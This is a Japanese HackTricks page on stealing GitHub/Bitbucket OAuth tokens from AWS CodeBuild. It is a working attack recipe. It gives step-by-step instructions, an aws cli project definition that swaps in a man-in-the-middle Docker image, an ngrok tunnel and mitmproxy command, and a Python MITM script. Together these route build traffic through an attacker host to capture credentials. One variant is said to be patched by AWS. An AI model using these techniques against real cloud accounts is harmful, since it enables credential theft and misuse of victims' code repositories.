# AWS Codebuild - トークンの漏洩

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを見たい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有する**ために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## Github/Bitbucketで設定されたトークンの回復

### Dockerイメージを介して

たとえば、アカウントにGithubへの認証が設定されていることがわかった場合、Codebuildを使用してそのアクセス（GHトークンまたはOAuthトークン）を**外部に漏洩**することができます。これは、プロジェクトのビルドを実行するためにCodebuildに**特定のDockerイメージを使用**させることで実現できます。

このためには、**新しいCodebuildプロジェクトを作成**するか、既存のプロジェクトの**環境を変更**して**Dockerイメージ**を設定します。

使用できるDockerイメージは[https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)です。これは非常に基本的なDockerイメージで、**環境変数 `https_proxy`**、**`http_proxy`**、**`SSL_CERT_FILE`**を設定します。これにより、**`https_proxy`**と**`http_proxy`**で指定されたホストのほとんどのトラフィックを傍受し、**`SSL_CERT_FILE`**で指定されたSSL証明書を信頼することができます。

1. **独自のDocker MitMイメージを作成してアップロードする**
* リポジトリの手順に従ってプロキシのIPアドレスを設定し、SSL証明書を設定し、**Dockerイメージをビルド**します。
* メタデータエンドポイントへのリクエストを傍受しないように、**`http_proxy`を設定しないでください**。
* `ngrok tcp 4444`のように**`ngrok`**を使用してホストにプロキシを設定できます。
* Dockerイメージがビルドされたら、それを**パブリックリポジトリ**（Dockerhub、ECRなど）に**アップロード**します。
2. **環境を設定する**
* **新しいCodebuildプロジェクトを作成**するか、既存のプロジェクトの環境を**変更**します。
* プロジェクトを**以前に生成したDockerイメージ**を使用するように設定します。
*

<figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
3. **ホストでMitMプロキシを設定する**
* **Githubリポジトリ**で指示されているように、次のようなものを使用できます：`mitmproxy --listen-port 4444 --set block_global=false --allow-hosts "github.com"`
4. **ビルドを実行して資格情報をキャプチャする**
* 認証ヘッダーでトークンを確認できます：

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

これは、aws cliからも次のように行うことができます。

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER",
"image": "docker.io/carlospolop/docker-mitm:v6",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
},
"serviceRole": "arn-service-role"
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### HTTPプロトコルを介して

{% hint style="success" %}
**この脆弱性は、2023年2月20日の週（おそらく金曜日）のいずれかの時点でAWSによって修正されました。したがって、攻撃者はこれを悪用することはできません :)**
{% endhint %}

CodeBuildで昇格された権限を持つ攻撃者は、設定されたGithub/BitbucketトークンまたはOAuth経由で設定された権限の場合は、コードにアクセスするために使用される一時的なOAuthトークンを漏洩させることができます。

* 攻撃者は、CodeBuildプロジェクトに環境変数**http\_proxy**と**https\_proxy**を追加し、それらを自分のマシンを指すように設定できます（例：`http://5.tcp.eu.ngrok.io:14972`）。

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

* 次に、githubリポジトリのURLをHTTPSではなくHTTPを使用するように変更します。例：**http://**github.com/carlospolop-forks/TestActions
* 次に、プロキシ変数（http\_proxyおよびhttps\_proxy）が指すポートで[https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)の基本的な例を実行します。
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* 最後に、**プロジェクトをビルド**をクリックすると、**認証情報**が平文（base64）でmitmポートに送信されます：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
これにより、攻撃者は自分のマシンからトークンを使用し、CodeBuildサービスを直接使用するよりも簡単に特権をリストアップし、乱用することができます。
{% endhint %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* **HackTricksで会社を宣伝**したい場合や、**最新バージョンのPEASSを入手**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)を入手しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**をフォロー**してください。
* **ハッキングのトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出**してください。

</details>
